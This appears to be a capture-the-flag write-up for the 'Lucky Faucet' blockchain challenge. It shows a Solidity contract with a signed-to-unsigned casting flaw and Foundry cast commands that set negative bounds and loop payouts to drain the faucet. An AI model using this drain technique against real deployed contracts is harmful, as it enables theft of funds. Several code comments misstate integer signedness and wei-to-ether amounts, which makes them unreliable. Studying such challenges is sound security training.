---
layout: post
title: "blockchain luckyfaucet"
date: 2024-03-14 17:18:49 -0700
categories: ctfs
description: Utilize the Foundry's cast function to interact with the contract via the provided RPC address and private key. Exploit the contract's integer declarations to underflow the value and receive Ethereum. Loop through the cast function to drain the available pool before submitting the flag.
parent: HackTheBox - Apocalypse '24
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
- "blockchain"
- "smart contract"
- "Ethereum"
- "integer manipulation"
- "Foundry"
---

## Lucky Faucet - Blockchain Challenge
The "Lucky Faucet" challenge involves exploiting integer declarations in the contract to receive Ethereum. The contract features three functions: a Constructor to set upper and lower bounds, a function to update bounds, and a function to send random Ethereum within the specified bounds.

### Exploiting Integer Declarations:
Using the Foundry's cast function, interact with the contract via the provided RPC address and private key. Abuse the integer declarations to underflow the value by passing negative values, circumventing the upper and lower bounds validation.

It's always worth trying random values when there's this much casting/mix-matching of types.
```c
pragma solidity 0.7.6;

contract LuckyFaucet {
    int64 public upperBound;
    int64 public lowerBound;

    constructor() payable {
        // start with 50M-100M wei Range until player changes it
        upperBound = 100_000_000;
        lowerBound =  50_000_000;
    }

    function setBounds(int64 _newLowerBound, int64 _newUpperBound) public { // <--- int64 only goes positive, uint goes negative
        require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
        require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
        require(_newLowerBound <= _newUpperBound);
        // why? because if you don't need this much, pls lower the upper bound :) <-- hints from challenge>
        // we don't have infinite money glitch.<-- hints from challenge>
        upperBound = _newUpperBound;
        lowerBound = _newLowerBound;
    }

    function sendRandomETH() public returns (bool, uint64) {
        int256 randomInt = int256(blockhash(block.number - 1)); // "but it's not actually random ï¤“"<-- hints from challenge>
        // we can safely cast to uint64 since we'll never <-- hints from challenge>
        // have to worry about sending more than 2**64 - 1 wei <-- hints from challenge>
        uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); 
        bool sent = msg.sender.send(amountToSend);
        return (sent, amountToSend);
    }
}
```

### Achieving the Goal:
The goal is to obtain at least 10 Ethereum. By looping through the cast function to send random Ethereum using the earlier contract, drain the available pool before submitting the flag to complete the challenge.

```sh
cast send --rpc-url "http://94.237.55.212:47096/" --private-key "<Private Kye generated from nc endpoint>" "<target contract generated by nc endpoint>" "setBounds(int64,int64)" -- -1 -1 #<-- First underflow to set the value to max(int64) 
for i in {1..100}; do cast send --rpc-url "http://94.237.55.212:47096/" --private-key "<Private Key generated from nc endpoint>" "<target contract generated by nc endpoint>" "sendRandomETH()"; done #<-- send ~8bil wei per call(about 8 eth)
```

Verifying the currency transfer:
```sh
watch cast balance --rpc-url http://94.237.55.212:47096 <either target or your address> -e #<-- -e outputs in eth instead of wei
```

### Conclusion:
The "Lucky Faucet" challenge highlights the importance of understanding smart contract functionalities and exploiting vulnerabilities within contract logic. By manipulating integer declarations, participants can achieve their objectives and demonstrate their proficiency in blockchain contract interaction.
